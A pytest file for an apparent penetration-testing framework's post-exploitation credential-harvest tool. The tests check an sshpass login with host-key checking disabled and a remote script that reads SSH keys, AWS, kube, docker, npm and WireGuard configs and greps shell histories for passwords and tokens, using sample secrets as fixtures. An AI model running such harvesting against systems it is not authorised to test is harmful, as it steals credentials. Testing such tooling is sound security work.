"""
Unit tests for the local_credential_harvest adapter, parser, Tool wrapper,
and contract.

The SSH call is mocked at the subprocess boundary for argv and parsing
tests. Parsing fixtures reproduce the marker-delimited output shape the
fixed remote script emits. A separate test runs the generated script
locally with ``sh`` against a temporary fake $HOME, so the shell logic
itself (presence checks, key-header gating, history grep, permission
denied) is exercised for real -- no remote host is contacted.
"""
from __future__ import annotations

import os
import shutil
import subprocess
from unittest.mock import MagicMock

import pytest

from tradecraft.adapters.local_credential_harvest import execute as ch_execute
from tradecraft.adapters.local_credential_harvest import parse as ch_parse
from tradecraft.tools.local_credential_harvest import LocalCredentialHarvest
from tradecraft.tools.profiles import load_profile

RSA_HEADER = "-----BEGIN RSA PRIVATE KEY-----"
OPENSSH_HEADER = "-----BEGIN OPENSSH PRIVATE KEY-----"

# Captured-shape output for a host where:
#  - ~/.aws/credentials exists with real-looking content
#  - ~/.kube/config is present but empty
#  - ~/.ssh/id_rsa is a real PEM key (only its header is emitted remotely)
#  - ~/.ssh/id_ed25519 exists but is not readable (permission denied case)
#  - ~/.npmrc is absent
#  - ~/.bash_history has credential-shaped lines
SAMPLE_HARVEST_OUTPUT = f"""@@RSCH:BEGIN ssh_id_rsa present 1679 private_key ~/.ssh/id_rsa
{RSA_HEADER}
@@RSCH:END ssh_id_rsa
@@RSCH:BEGIN ssh_id_ed25519 unreadable 0 private_key ~/.ssh/id_ed25519
@@RSCH:END ssh_id_ed25519
@@RSCH:BEGIN ssh_id_ecdsa absent 0 private_key ~/.ssh/id_ecdsa
@@RSCH:END ssh_id_ecdsa
@@RSCH:BEGIN aws_credentials present 118 text ~/.aws/credentials
[default]
aws_access_key_id = AKIAEXAMPLEEXAMPLE12
aws_secret_access_key = wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY

@@RSCH:END aws_credentials
@@RSCH:BEGIN aws_config absent 0 text ~/.aws/config
@@RSCH:END aws_config
@@RSCH:BEGIN kube_config present 0 text ~/.kube/config

@@RSCH:END kube_config
@@RSCH:BEGIN npmrc absent 0 text ~/.npmrc
@@RSCH:END npmrc
@@RSCH:BEGIN bash_history present 412 history ~/.bash_history
mysql -u root -pS3cretPass db
curl -H "Authorization: Bearer abc123" https://api.internal/v1/x
export API_TOKEN=deadbeef
@@RSCH:END bash_history
@@RSCH:BEGIN zsh_history absent 0 history ~/.zsh_history
@@RSCH:END zsh_history
@@RSCH:DONE
"""

SAMPLE_SSH_FAILURE_STDERR = "Permission denied, please try again.\n"


def _fake_runner(stdout: str = "", stderr: str = "", returncode: int = 0):
    def runner(argv, **kwargs):
        return subprocess.CompletedProcess(argv, returncode, stdout=stdout, stderr=stderr)

    return runner


# ----- parse_host_port / detect_ssh_error -----


def test_parse_host_port_default():
    assert ch_parse.parse_host_port("10.0.0.15") == ("10.0.0.15", None)


def test_parse_host_port_explicit():
    assert ch_parse.parse_host_port("10.0.0.15:2222") == ("10.0.0.15", 2222)


def test_parse_host_port_non_numeric_suffix_kept_whole():
    assert ch_parse.parse_host_port("fe80::1") == ("fe80::1", None)


def test_detect_ssh_error_none_when_clean():
    assert ch_parse.detect_ssh_error(SAMPLE_HARVEST_OUTPUT, "") is None


def test_detect_ssh_error_permission_denied():
    err = ch_parse.detect_ssh_error("", SAMPLE_SSH_FAILURE_STDERR)
    assert err is not None
    assert "permission denied" in err.lower()


# ----- argv construction -----


def test_build_argv_matches_linpeas_sshpass_shape():
    argv = ch_execute.build_argv("10.0.0.15:2222", "alice", "hunter2", binary="/usr/bin/sshpass")
    assert argv[:7] == [
        "/usr/bin/sshpass",
        "-p",
        "hunter2",
        "ssh",
        "-o",
        "StrictHostKeyChecking=no",
        "-o",
    ]
    assert "UserKnownHostsFile=/dev/null" in argv
    assert "-p" in argv[7:] and "2222" in argv
    assert "alice@10.0.0.15" in argv
    assert argv[-1] == ch_execute.REMOTE_CMD


def test_build_argv_is_exactly_one_ssh_invocation():
    argv = ch_execute.build_argv("10.0.0.15", "alice", "pw", binary="sshpass")
    assert argv.count("ssh") == 1
    assert "curl" not in " ".join(argv)


def test_remote_script_covers_every_fixed_path_and_nothing_else():
    script = ch_execute.build_remote_script()
    expected_home_relative = {
        ".ssh/id_rsa",
        ".ssh/id_ed25519",
        ".ssh/id_ecdsa",
        ".aws/credentials",
        ".aws/config",
        ".kube/config",
        ".docker/config.json",
        ".npmrc",
        ".pypirc",
        ".netrc",
        ".bash_history",
        ".zsh_history",
    }
    expected_absolute = {
        "/etc/wireguard/wg0.conf",
        "/etc/wireguard/wg1.conf",
    }
    actual_paths = {rel for _, rel, _ in ch_execute.CREDENTIAL_FILES}
    assert actual_paths == expected_home_relative | expected_absolute
    for rel in expected_home_relative:
        assert f'"$HOME/{rel}"' in script
    for abs_path in expected_absolute:
        assert f'f="{abs_path}"' in script
        # Absolute paths must never be prefixed with $HOME.
        assert f'$HOME{abs_path}' not in script
    assert script.count(ch_parse.DONE_MARKER) == 1


def test_wireguard_entries_are_text_kind_not_private_key():
    # No clean way to redact just the key from a small INI-style config,
    # so the whole file is returned as "text" -- same handling as
    # .aws/credentials or .kube/config.
    by_label = {label: kind for label, _, kind in ch_execute.CREDENTIAL_FILES}
    assert by_label["wireguard_wg0"] == "text"
    assert by_label["wireguard_wg1"] == "text"


def test_remote_script_is_read_only():
    script = ch_execute.build_remote_script()
    for mutating in ("rm ", "mv ", "chmod", "> ", "tee ", "sed -i", "dd "):
        assert mutating not in script


# ----- execute() error paths and mocked runs -----


def test_execute_missing_user_fails_without_running():
    runner = MagicMock()
    raw = ch_execute.execute("10.0.0.15", "", "pw", runner=runner)
    assert raw.error == "ssh_user is required for local_credential_harvest"
    runner.assert_not_called()


def test_execute_missing_pass_fails_without_running():
    runner = MagicMock()
    raw = ch_execute.execute("10.0.0.15", "alice", "  ", runner=runner)
    assert raw.error == "ssh_pass is required for local_credential_harvest"
    runner.assert_not_called()


def test_execute_empty_target_fails_without_running():
    runner = MagicMock()
    raw = ch_execute.execute("", "alice", "pw", runner=runner)
    assert raw.error == "empty target host"
    runner.assert_not_called()


def test_execute_missing_sshpass(monkeypatch):
    monkeypatch.setattr(ch_execute, "find_sshpass_binary", lambda: None)
    raw = ch_execute.execute("10.0.0.15", "alice", "pw", runner=MagicMock())
    assert raw.error == "sshpass binary not found on PATH"


def test_execute_passes_stdin_devnull_and_timeout(monkeypatch):
    monkeypatch.setattr(ch_execute, "find_sshpass_binary", lambda: "/usr/bin/sshpass")
    runner = MagicMock(return_value=subprocess.CompletedProcess([], 0, stdout="x", stderr=""))
    raw = ch_execute.execute("10.0.0.15", "alice", "pw", runner=runner)
    assert raw.stdout == "x"
    _, kwargs = runner.call_args
    assert kwargs["stdin"] == subprocess.DEVNULL
    assert kwargs["timeout"] == ch_execute.DEFAULT_TIMEOUT


def test_execute_timeout_is_reported(monkeypatch):
    monkeypatch.setattr(ch_execute, "find_sshpass_binary", lambda: "/usr/bin/sshpass")

    def boom(argv, **kwargs):
        raise subprocess.TimeoutExpired(argv, kwargs["timeout"])

    raw = ch_execute.execute("10.0.0.15", "alice", "pw", runner=boom)
    assert "timed out" in raw.error


def test_execute_generic_exception_is_reported(monkeypatch):
    monkeypatch.setattr(ch_execute, "find_sshpass_binary", lambda: "/usr/bin/sshpass")

    def boom(argv, **kwargs):
        raise OSError("pipe broke")

    raw = ch_execute.execute("10.0.0.15", "alice", "pw", runner=boom)
    assert "pipe broke" in raw.error


# ----- parsing against captured-shape output -----


def _by_label(files):
    return {f["label"]: f for f in files}


def test_parse_present_text_file_returns_full_content():
    files, complete = ch_parse.parse_harvest_output(SAMPLE_HARVEST_OUTPUT)
    assert complete is True
    aws = _by_label(files)["aws_credentials"]
    assert aws["presence"] == "present"
    assert aws["path"] == "~/.aws/credentials"
    assert aws["size_bytes"] == 118
    assert "aws_access_key_id = AKIAEXAMPLEEXAMPLE12" in aws["content"]
    assert "aws_secret_access_key" in aws["content"]
    assert aws["empty"] is False
    assert aws["truncated"] is False


def test_parse_present_but_empty_file():
    files, _ = ch_parse.parse_harvest_output(SAMPLE_HARVEST_OUTPUT)
    kube = _by_label(files)["kube_config"]
    assert kube["presence"] == "present"
    assert kube["size_bytes"] == 0
    assert kube["empty"] is True
    assert kube["content"] == ""


def test_parse_absent_file():
    files, _ = ch_parse.parse_harvest_output(SAMPLE_HARVEST_OUTPUT)
    npm = _by_label(files)["npmrc"]
    assert npm == {
        "label": "npmrc",
        "path": "~/.npmrc",
        "kind": "text",
        "size_bytes": 0,
        "presence": "absent",
    }


def test_parse_permission_denied_file_is_unreadable_not_present():
    files, _ = ch_parse.parse_harvest_output(SAMPLE_HARVEST_OUTPUT)
    ed = _by_label(files)["ssh_id_ed25519"]
    assert ed["presence"] == "unreadable"
    assert "content" not in ed
    assert "key_material" not in ed
    assert "note" in ed


def test_parse_private_key_header_only_is_redacted():
    files, _ = ch_parse.parse_harvest_output(SAMPLE_HARVEST_OUTPUT)
    rsa = _by_label(files)["ssh_id_rsa"]
    assert rsa["presence"] == "present"
    assert rsa["looks_like_key"] is True
    assert rsa["key_type"] == "RSA"
    assert rsa["key_material"] == "redacted"
    assert "content" not in rsa


def test_parse_private_key_discards_any_body_lines():
    # Even if the remote side printed body lines, only the header is kept.
    output = (
        f"@@RSCH:BEGIN ssh_id_ed25519 present 900 private_key ~/.ssh/id_ed25519\n"
        f"{OPENSSH_HEADER}\n"
        "b3BlbnNzaC1rZXktdjEAAAAABG5vbmU\n"
        "SECRETBODYLINE==\n"
        "@@RSCH:END ssh_id_ed25519\n"
        "@@RSCH:DONE\n"
    )
    files, _ = ch_parse.parse_harvest_output(output)
    rec = files[0]
    assert rec["key_type"] == "OPENSSH"
    assert "SECRETBODYLINE" not in repr(rec)
    assert "b3BlbnNz" not in repr(rec)


def test_parse_private_key_not_pem_is_rejected():
    output = (
        "@@RSCH:BEGIN ssh_id_ecdsa not_key_material 42 private_key ~/.ssh/id_ecdsa\n"
        "@@RSCH:END ssh_id_ecdsa\n"
        "@@RSCH:DONE\n"
    )
    files, _ = ch_parse.parse_harvest_output(output)
    rec = files[0]
    assert rec["presence"] == "present"
    assert rec["looks_like_key"] is False
    assert "key_type" not in rec


def test_parse_history_returns_only_matching_lines():
    files, _ = ch_parse.parse_harvest_output(SAMPLE_HARVEST_OUTPUT)
    hist = _by_label(files)["bash_history"]
    assert hist["presence"] == "present"
    assert hist["match_count"] == 3
    assert hist["matching_lines"] == [
        "mysql -u root -pS3cretPass db",
        'curl -H "Authorization: Bearer abc123" https://api.internal/v1/x',
        "export API_TOKEN=deadbeef",
    ]
    assert hist["matching_lines_truncated"] is False


def test_parse_history_empty_when_no_matches():
    output = (
        "@@RSCH:BEGIN zsh_history present 12 history ~/.zsh_history\n"
        "@@RSCH:END zsh_history\n"
        "@@RSCH:DONE\n"
    )
    files, _ = ch_parse.parse_harvest_output(output)
    assert files[0]["match_count"] == 0
    assert files[0]["matching_lines"] == []


def test_parse_history_caps_returned_lines():
    body = "\n".join(f"export TOKEN=t{i}" for i in range(ch_parse.MAX_HISTORY_LINES + 25))
    output = (
        f"@@RSCH:BEGIN bash_history present 9999 history ~/.bash_history\n"
        f"{body}\n@@RSCH:END bash_history\n@@RSCH:DONE\n"
    )
    files, _ = ch_parse.parse_harvest_output(output)
    rec = files[0]
    assert rec["match_count"] == ch_parse.MAX_HISTORY_LINES + 25
    assert len(rec["matching_lines"]) == ch_parse.MAX_HISTORY_LINES
    assert rec["matching_lines_truncated"] is True


def test_parse_incomplete_output_without_done_marker():
    output = "@@RSCH:BEGIN npmrc absent 0 text ~/.npmrc\n@@RSCH:END npmrc\n"
    files, complete = ch_parse.parse_harvest_output(output)
    assert complete is False
    assert len(files) == 1


def test_parse_harvest_result_success_summary():
    raw = ch_parse.RawHarvestResult(target="10.0.0.15", stdout=SAMPLE_HARVEST_OUTPUT)
    result = ch_parse.parse_harvest_result(raw)
    assert result["status"] == "success"
    assert result["target"] == "10.0.0.15"
    assert result["complete"] is True
    assert result["files_checked"] == 9  # blocks in SAMPLE_HARVEST_OUTPUT
    assert result["files_present"] == 4  # ssh_id_rsa, aws_credentials, kube_config, bash_history
    assert result["private_keys_found"] == 1


def test_parse_harvest_result_ssh_auth_failure_is_failed_not_empty():
    raw = ch_parse.RawHarvestResult(
        target="10.0.0.15", stdout="", stderr=SAMPLE_SSH_FAILURE_STDERR
    )
    result = ch_parse.parse_harvest_result(raw)
    assert result["status"] == "failed"
    assert "permission denied" in result["error"].lower()


def test_parse_harvest_result_no_markers_is_failed():
    raw = ch_parse.RawHarvestResult(target="10.0.0.15", stdout="weird shell banner\n")
    result = ch_parse.parse_harvest_result(raw)
    assert result["status"] == "failed"
    assert "no harvest output" in result["error"]


def test_parse_harvest_result_execution_error():
    raw = ch_parse.RawHarvestResult(target="10.0.0.15", error="sshpass binary not found on PATH")
    result = ch_parse.parse_harvest_result(raw)
    assert result == {
        "target": "10.0.0.15",
        "status": "failed",
        "error": "sshpass binary not found on PATH",
    }


# ----- the generated script, run locally against a fake $HOME -----


@pytest.mark.skipif(shutil.which("sh") is None, reason="no POSIX sh on PATH")
def test_remote_script_runs_correctly_against_fake_home(tmp_path):
    home = tmp_path / "home"
    (home / ".aws").mkdir(parents=True)
    (home / ".aws" / "credentials").write_text(
        "[default]\naws_access_key_id = AKIAFAKE\n"
    )
    (home / ".kube").mkdir()
    (home / ".kube" / "config").write_text("")
    (home / ".ssh").mkdir()
    (home / ".ssh" / "id_rsa").write_text(
        "-----BEGIN RSA PRIVATE KEY-----\nMIIEFAKEBODY\n-----END RSA PRIVATE KEY-----\n"
    )
    (home / ".ssh" / "id_ed25519").write_text("-----BEGIN OPENSSH PRIVATE KEY-----\nAAAA\n")
    (home / ".ssh" / "id_ed25519").chmod(0o000)
    (home / ".ssh" / "id_ecdsa").write_text("this is not a key\n")
    (home / ".bash_history").write_text(
        "ls\nmysql -u root -pS3cret db\nmkdir -p /tmp/x\nexport API_TOKEN=abc\n"
    )

    if os.geteuid() == 0:
        pytest.skip("running as root: chmod 000 does not make the file unreadable")

    env = dict(os.environ, HOME=str(home), LC_ALL="C")
    proc = subprocess.run(
        ["sh", "-c", ch_execute.build_remote_script()],
        capture_output=True,
        text=True,
        env=env,
        timeout=30,
    )

    result = ch_parse.parse_harvest_result(
        ch_parse.RawHarvestResult(target="fake", stdout=proc.stdout, stderr=proc.stderr)
    )
    assert result["status"] == "success"
    assert result["complete"] is True
    files = _by_label(result["files"])

    assert files["aws_credentials"]["presence"] == "present"
    assert "AKIAFAKE" in files["aws_credentials"]["content"]
    assert files["kube_config"]["empty"] is True
    assert files["ssh_id_rsa"]["key_type"] == "RSA"
    assert "MIIEFAKEBODY" not in proc.stdout  # key body never printed
    assert files["ssh_id_ed25519"]["presence"] == "unreadable"
    assert files["ssh_id_ecdsa"]["looks_like_key"] is False
    assert files["npmrc"]["presence"] == "absent"
    hist = files["bash_history"]
    # `mkdir -p` also matches the "-p <arg>" pattern; accepted noise.
    assert hist["matching_lines"] == [
        "mysql -u root -pS3cret db",
        "mkdir -p /tmp/x",
        "export API_TOKEN=abc",
    ]


# ----- Tool wrapper and contract -----


def test_tool_id_and_contract():
    tool = LocalCredentialHarvest()
    assert tool.tool_id == "local_credential_harvest"
    assert tool.destructive is False
    assert tool.required_binary == "sshpass"
    assert tool.scope_param == "target"
    assert tool.spec.name == "local_credential_harvest"


def test_tool_run_wires_execute_and_parse(monkeypatch):
    monkeypatch.setattr(ch_execute, "find_sshpass_binary", lambda: "/usr/bin/sshpass")
    monkeypatch.setattr(
        ch_execute.subprocess,
        "run",
        _fake_runner(stdout=SAMPLE_HARVEST_OUTPUT),
    )
    result = LocalCredentialHarvest().run(target="10.0.0.15", ssh_user="alice", ssh_pass="pw")
    assert result["status"] == "success"
    assert result["files_present"] == 4


def test_tool_extract_facts_on_success():
    tool = LocalCredentialHarvest()
    facts = tool.extract_facts(
        {"target": "10.0.0.15:2222"},
        {"status": "success", "files_present": 4, "private_keys_found": 1},
    )
    assert facts == [
        {
            "host": "10.0.0.15",
            "port": 2222,
            "protocol": "ssh",
            "local_credential_harvest_run": True,
            "local_credential_files_present": 4,
            "local_private_keys_found": 1,
        }
    ]


def test_tool_extract_facts_empty_on_failure():
    tool = LocalCredentialHarvest()
    assert tool.extract_facts({"target": "10.0.0.15"}, {"status": "failed"}) == []


def test_tool_is_in_post_exploitation_profile():
    assert "local_credential_harvest" in load_profile("post-exploitation")
